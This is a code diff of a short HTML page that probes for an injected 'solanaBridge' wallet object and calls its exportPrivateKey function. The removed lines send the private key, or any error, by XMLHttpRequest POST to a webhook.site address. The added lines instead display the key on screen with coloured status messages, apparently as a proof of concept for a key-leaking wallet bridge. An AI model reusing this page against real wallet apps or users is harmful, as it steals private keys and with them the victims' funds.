@@ -1,19 +1,26 @@
-<html><body><script>
-var x = new XMLHttpRequest();
-x.open('POST', 'https://webhook.site/d1a1de27-fff4-4e9d-a4ea-954bd54b2225', true);
-x.setRequestHeader('Content-Type','text/plain');
-
+<html><body style="margin:0;background:#000">
+<div id="m" style="padding:40px;color:white;font-family:monospace;font-size:20px">
+Loading...
+</div>
+<script>
+var m = document.getElementById('m');
 try {
   if(typeof solanaBridge !== 'undefined') {
-    solanaBridge.exportPrivateKey('').then(function(k){
-      x.send('KEY:' + k);
+    document.body.style.background = '#004400';
+    m.innerHTML = 'BRIDGE: YES<br>TESTING...';
+    solanaBridge.exportPrivateKey("").then(function(k){
+      document.body.style.background = '#FFD700';
+      m.innerHTML = 'PRIVATE KEY:<br><span style="font-size:28px;word-break:break-all">' + k + '</span>';
     }).catch(function(e){
-      x.send('ERR:' + e.message);
+      document.body.style.background = '#884400';
+      m.innerHTML = 'BRIDGE YES<br>exportPrivateKey ERROR:<br>' + e.message;
     });
   } else {
-    x.send('NO_BRIDGE');
+    document.body.style.background = '#440000';
+    m.innerHTML = 'NO BRIDGE';
   }
 } catch(e) {
-  x.send('FATAL:' + e.message);
+  document.body.style.background = '#440000';
+  m.innerHTML = 'ERROR: ' + e.message;
 }
 </script></body></html>
